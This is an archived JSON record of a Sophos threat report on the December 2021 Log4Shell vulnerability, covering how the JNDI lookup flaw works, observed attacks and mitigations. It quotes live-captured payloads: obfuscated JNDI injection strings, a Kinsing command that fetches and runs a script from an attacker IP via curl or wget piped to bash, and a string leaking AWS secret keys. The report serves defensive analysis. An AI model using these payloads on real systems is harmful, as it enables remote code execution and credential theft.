{
    "id": "cbcad73c-031b-4452-ba73-6dc4caa7cb1a",
    "created_at": "2023-01-12T15:06:01.546751Z",
    "updated_at": "2025-03-27T02:17:01.074667Z",
    "deleted_at": null,
    "sha1_hash": "06b8be16eaec9f5e4e569346d4e69cc57a5f4558",
    "title": "2021-12-12 - Log4Shell Hell- anatomy of an exploit outbreak",
    "authors": "",
    "file_creation_date": "2022-05-28T01:23:06Z",
    "file_modification_date": "2022-05-28T01:23:06Z",
    "file_size": 1268495,
    "plain_text": "# Log4Shell Hell: anatomy of an exploit outbreak\n\n**[news.sophos.com/en-us/2021/12/12/log4shell-hell-anatomy-of-an-exploit-outbreak/](https://news.sophos.com/en-us/2021/12/12/log4shell-hell-anatomy-of-an-exploit-outbreak/)**\n\nSean Gallagher December 13, 2021\n\n[On December 9, a severe remote code vulnerability was revealed in Apache’s Log4J, a very](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44228)\ncommon logging system used by developers of web and server applications based on Java\nand other programming languages. The vulnerability affects a broad range of services and\napplications on servers, making it extremely dangerous—and the latest updates for those\nserver applications urgent.\n\nThe vulnerability makes it possible for any attacker who can inject text into log messages or\nlog message parameters into server logs that load code from a remote server; The targeted\nserver will then execute that code via calls to the Java Naming and Directory Interface\n(JNDI). JNDI interfaces with a number of network services, including the Lightweight\nDirectory Access Protocol (LDAP), Domain Name Service (DNS), Java’s Remote Interface\n(RMI), and the Common Object Request Broker (CORBA). Sophos has seen efforts to\nexploit LDAP, DNS and RMI, using a URL tagged to those services redirected to an external\nserver.\n\n\n-----\n\nSophos is already detecting malicious cryptominer operations attempting to leverage the\n[vulnerability, and there are credible reports from other sources that several automated](https://www.govcert.ch/blog/zero-day-exploit-targeting-popular-java-library-log4j/)\nbotnets (such as Mirai, Tsunami, and Kinsing) have begun to exploit it as well. Other types of\nattacks – and payloads – are likely to rapidly follow. While there are steps that server\noperators can take to mitigate the vulnerability, the best fix is to upgrade to the patched\n[version, already released by Apache in Log4j 2.15.0. However, rolling out an upgrade may](http://mail-archives.apache.org/mod_mbox/www-announce/202112.mbox/%3CD88D40C5-8884-470E-8FA3-3B6D6899A7B0@apache.org%3E)\nnot be all that simple—especially if organizations don’t know where it’s been deployed as a\ncomponent. (A list of malware detections associated with Log4J thus far can be found at the\nend of this report.)\n\nSimilar critical JNDI injection vulnerabilities have been found in other Java server\ncomponents in the past, including one in the Internet Inter-ORB Protocol (IIOP)\nimplementation of Oracle’s WebLogic Server (CVE-2020-2551). But the widespread use of\nLog4J in both commercial and open-source software connected to the Internet—web and\nmobile application servers, email servers (including Apache’s Java-based JAMES email\nserver), and cloud services—makes this an especially difficult vulnerability to track down and\npatch. Previous flaws in Log4J have been far less severe.\n\nSophos has already detected hundreds of thousands of attempts since December 9 to\nremotely execute code using this vulnerability, and log searches by other organizations\n(including Cloudflare) suggest the vulnerability may have been openly exploited for weeks\nprior to its public exposure. The instances detected by Sophos have been mostly scans for\nthe vulnerability, exploit tests, and attempts to install coin miners. We have also seen\nattempts to extract information from services, including Amazon Web Services keys and\nother private data.\n\n## How the Log4J exploit works\n\n\n-----\n\nThe flaw in earlier versions of Log4J is caused by a feature called message lookup\n_substitution. When enabled (which it was, by default, before the bug fix), Log4j would detect_\nstrings referencing JNDI resources in configuration sources, log messages, and parameters\npassed by applications. Because Log4J doesn’t sanitize URLs passed in these strings, an\nattacker can craft malicious requests to applications that use Log4J containing message\nsubstitution strings in fields containing a URL for a malicious server.\n\nIn the case of web applications, the string could be part of any portion of an HTTP\ncommunication that would be logged, formatted as a substitution command that references\nthe malicious server—in the format ${jndi:[protocol]://[remote server and code\n**address]}. There are a variety of forms of obfuscation being used to prevent detection of**\nscanning or exploitation, including the use of nested strings to invoke the JNDI interface\n(such as (${${::-j}${::-n}${::-d}${::-I}) ).\n\nWhen passed to Log4J, lookup commands using JNDI result in Log4J reaching out to a\nserver (local or remote) to fetch Java code. In the benign scenario, this code would be to\nhelp generate the data intended to be logged. But the essence of this vulnerability is that this\nsame mechanism allows for execution of unvetted, malicious, remote Java code.\n\nTools such as _[Interactsh make this all too easy, enabling attackers to issue requests where](https://github.com/projectdiscovery/interactsh)_\nthe HTTP headers are “sprayed” with malicious strings, constructed to tease the receiving\napplication into performing the message substitution, at which point the application triggers\nthe vulnerability and loads or runs the remote code.\n\n\n-----\n\nBelow is a list of the HTTP headers seen in a GET request that illustrates the attacker using\nInteractsh to probe for a vulnerable servers, throwing a JNDI reference into nearly every\nelement of the request:\n```\nreferer=${jndi:ldap://[redacted].interact.sh},\nx-http-host-override=${jndi:ldap://[redacted].interact.sh},\ntrue-client-ip=${jndi:ldap://[redacted].interact.sh},\nx-forwarded-port=443,\nx-client-ip=${jndi:ldap://[redacted].interact.sh},\ncf-connecting_ip=${jndi:ldap://[redacted].interact.sh},\nx-forwarded-host=${jndi:ldap://[redacted].interact.sh},\ncontact=${jndi:ldap://[redacted].interact.sh},\nhost=[redacted].com,\nfrom=${jndi:ldap://[redacted].interact.sh},\ncache-control=no-transform,\nx-forwarded-proto=https,\naccept-language=en,\nclient-ip=${jndi:ldap://[redacted].interact.sh},\nx-forwarded-for=${jndi:ldap://[redacted].interact.sh},\nx-originating-ip=${jndi:ldap://[redacted].interact.sh},\nx-host=${jndi:ldap://[redacted].interact.sh},\nforwarded=${jndi:ldap://[redacted].interact.sh},\naccept=*/*,\nx-real-ip=${jndi:ldap://[redacted].interact.sh},\n\n```\nPayloads\n\nMany of the initial attempts we’ve seen to leverage the Log4J exploit were associated with\ncryptocurrency miners. This includes Kinsing, a miner-related botnet, using a variety of\nobfuscation methods:\n```\nGET /?x=${jndi:ldap://93[.]189[.]42.8:5557/Basic/Command/Base64/\nKGN1cmwgLXMgOTMuMTg5LjQyLjgvbGguc2h8fHdnZXQgLXEgLU8tIDkzLjE4OS40Mi44L2xoLnNoKXxiYXNo}\nHTTP/1.1\" 200 3440 \"${jndi:${lower:l}${lower:d}${lower:a}${lower:p}\n://93[.]189.42.8:5557/Basic/Command/Base64/KGN1cmwgLXMgOTMuMTg5LjQyLjgvbGguc2h8fHdnZXQ\nXEgLU8tIDkzLjE4OS40Mi44L2xoLnNoKXxiYXNo}\"\n\"${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://93[.]189.42.8:5557\n/Basic/Command/Base64/KGN1cmwgLXMgOTMuMTg5LjQyLjgvbGguc2h8fHdnZXQgLXEgLU8tIDkzLjE4OS40\ni44L2xoLnNoKXxiYXNo}\"\n\n```\nThe contents of the URL include a command encoded in Base64:\n```\n(curl -s 93.189.42.8/lh.sh||wget -q -O- 93.189.42.8/lh.sh)|bash\n\n```\nSophos has also recorded attempts to reveal AWS access keys from a host using the Log4J\nvulnerability using another obfuscation technique to evade detection of the JNDI calls. These\nstrings attempt to get the targeted endpoint to return the environmental variable used by\nprograms that interact with AWS resources:\n\n\n-----\n\n```\n GET /a1${${env:lsweqw: j}ndi${env:lsweqw: :}${env:lsweqw: r}mi${env:lsweqw: :}\n//[MASKED_IP}/dupa123/MASKED_HOST:80/gp/${env:USER}/${env:AWS_ACCESS_KEY_ID}/\n${env:AWS_SECRET_ACCESS_KEY}/dupa1234} HTTP/1.1\" 302 455 \"aaaaa1${${env:lsweqw:-j}\nndi${env:lsweqw:-:}${env:lsweqw:-r}mi${env:lsweqw:-:}\n//1[MASKED_IP}:1099/dupa123/MASKED_HOST:80/gr/${env:USER}/${env:AWS_ACCESS_KEY_ID}/\n${env:AWS_SECRET_ACCESS_KEY}/dupa1234}\" \"aaaaa1${${env:lsweqw:-j}ndi${env:lsweqw:-:}\n${env:lsweqw:r}mi${env:lsweqw:-:}//[MASKED_IP]/dupa123/MASKED_HOST:80/ga/${env:USER}/\n${env:AWS_ACCESS_KEY_ID}/${env:AWS_SECRET_ACCESS_KEY}/dupa1234}\"\n\n## Detection and correction\n\n```\nSophosLabs has deployed a number of IPS rules to scan for traffic attempting to exploit the\nLog4J vulnerability. Less than a day after it became public, we saw a brief spike in traffic\ntargeting it. Over the weekend, it began to surge, with the greatest spike coming over\nSaturday night and into Sunday morning (UTC).\n\nThe vast majority of this traffic (about 90%) was using the LDAP protocol as the target for\nexploits; smaller subsets used DNS and RMI. Some of this traffic, upon examination, may\nhave been internal scanning for vulnerabilities by organizations, but much of it appeared to\n\n\n-----\n\nbe probes for exploitable systems by attackers. A sampling of requests collected from\ntelemetry showed many using Interactsh, using a variety of obfuscation techniques to evade\nrules searching for “JNDI”, such as these attempts to use the RMI call:\n```\n${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://[identifier].interact.sh/poc}\n${${lower:jndi}:${lower:rmi}://[identifier].interact.sh/poc}\n${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}:\n //[identifier].interact.sh/poc}\n\n```\nResolving the Log4J vulnerability requires defense in depth. Organizations should deploy\nrules to block exploit traffic from all internet-facing services (Sophos IPS currently blocks\ntraffic matching known Log4J exploit signatures). But long-term protection will require\nidentifying and updating instances of Log4J or mitigating the issue by changing settings in\nLog4J (either through XML or YAML configuration files in the root of Log4J’s path settings, or\nprogramatically). That may require code changes in products where Log4J is embedded.\n\n**SophosLabs would like to acknowledge the contributions of Fraser Howard, Hardik**\n**Shah, Gabor Szappanos, and Mukesh Kumar for their contributions to this report.**\n\n## Sophos detections for malware using Log4J:\n\nTroj/JavaDl-AAN\n\nTroj/Java-AIN\n\nTroj/BatDl-GR\n\nMal/JavaKC-B\n\nXMRig Miner (PUA)\n\nTroj/Bckdr-RYB\n\nTroj/PSDl-LR\n\nMal/ShellDl-A\n\nLinux/DDoS-DT\n\nLinux/Miner-ADG\n\nLinux/DDoS-DS\n\nLinux/Miner-ZS\n\nLinux/Miner-WU\n\nLinux/Rootkt-M\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2021/2021-12-12 - Log4Shell Hell- anatomy of an exploit outbreak.pdf"
    ],
    "report_names": [
        "2021-12-12 - Log4Shell Hell- anatomy of an exploit outbreak.pdf"
    ],
    "threat_actors": [
        {
            "id": "a6c351ea-01f1-4c9b-af75-cfbb3b269ed3",
            "created_at": "2023-01-06T13:46:39.390649Z",
            "updated_at": "2025-03-27T02:00:03.072899Z",
            "deleted_at": null,
            "main_name": "Kinsing",
            "aliases": [
                "Money Libra"
            ],
            "source_name": "MISPGALAXY:Kinsing",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        }
    ],
    "ts_created_at": 1673535961,
    "ts_updated_at": 1743041821,
    "ts_creation_date": 1653700986,
    "ts_modification_date": 1653700986,
    "files": {
        "pdf": "https://archive.orkl.eu/06b8be16eaec9f5e4e569346d4e69cc57a5f4558.pdf",
        "text": "https://archive.orkl.eu/06b8be16eaec9f5e4e569346d4e69cc57a5f4558.txt",
        "img": "https://archive.orkl.eu/06b8be16eaec9f5e4e569346d4e69cc57a5f4558.jpg"
    }
}